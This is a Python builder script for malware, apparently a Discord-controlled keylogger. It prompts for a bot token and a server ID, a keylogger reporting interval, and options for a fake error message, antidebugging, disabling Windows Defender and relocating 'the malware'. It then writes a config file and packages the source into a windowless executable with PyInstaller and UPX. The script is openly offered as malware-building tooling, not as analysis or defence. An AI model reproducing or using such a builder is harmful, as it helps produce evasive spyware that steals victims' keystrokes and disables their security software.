import subprocess
import os
from colorama import Fore, Style
import sys
import time


def build(icon, file, upx):
    print(Fore.BLUE +"[+] Building exe..."+ Style.RESET_ALL)
    if upx:
        try:
            subprocess.run(f"pyinstaller --onefile -w --clean -i {icon} --upx-dir C:/UPX {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True) #subprocess.run(f"pyinstaller --onefile -w -i {icon}  --upx-dir C:\UPX {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
            print(Fore.GREEN +"[+] Building exe successfully finished!"+ Style.RESET_ALL)
            print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
        except:
            print(Fore.RED +"[-] Please make sure you have pyinstaller and UPX installed under C:/UPX!"+ Style.RESET_ALL)
            time.sleep(3)
            sys.exit(1)
    else:
        try:
            subprocess.run(f"pyinstaller --onefile --clean -w -i {icon} {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True) #subprocess.run(f"pyinstaller --onefile -w -i {icon}  --upx-dir C:\UPX {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
            print(Fore.GREEN +"[+] Building exe successfully finished!"+ Style.RESET_ALL)
            print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
        except:
            print(Fore.RED +"[-] Please make sure you have pyinstaller installed!"+ Style.RESET_ALL)
            time.sleep(3)
            sys.exit(1)


def convert(value, name):
    if value.lower() == "y":
        return True
    elif value.lower() == "n":
        return False
    else:
        print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(0)

def config(path, token, guild_id, interval, error, antidebug, defender, move):    
    config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
    
    if not os.path.exists(path):
        print(Fore.RED +f"[-] Please make sure you have source code under '{path}' folder relative to builder or edit building options!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(1)
    
    with open(f"{path}\config.py", "w") as f:
        f.write(config)


token = input("[?] Enter bot token: ")
guild_id = input("[?] Enter server ID (guild ID): ")
interval = input("[?] Enter interval for keylogger sending (in secondes): ")
error = input("[?] Enable fake error? [Y/n]: ")
antidebug = input("[?] Enable antidebug? [Y/n]: ")
defender = input("[?] Enable win defender disabler? [Y/n]: ")
move = input("[?] Move the malware to the special location? [Y/n]: ")


choice = input("> Do you want to edit building options[y/N]: ")
if choice.lower() == "y":
    upx = input("[?] Use UPX? [Y/n]: ")
    if upx.lower() == "y":
        upx = True
    elif upx.lower() == "n":
        upx = False
    else:
        print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(0)
        
    icon = input("[?] Enter icon file: ")
    path = input("[?] Enter source code directory: ")
    
    config(path, token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
    build(icon, f"{path}\main.py", upx)
    
elif choice.lower() == "n":
    config("src", token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
    build("icon.ico", "src\main.py", True)
    
else:
    print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
    time.sleep(3)
    sys.exit(0)
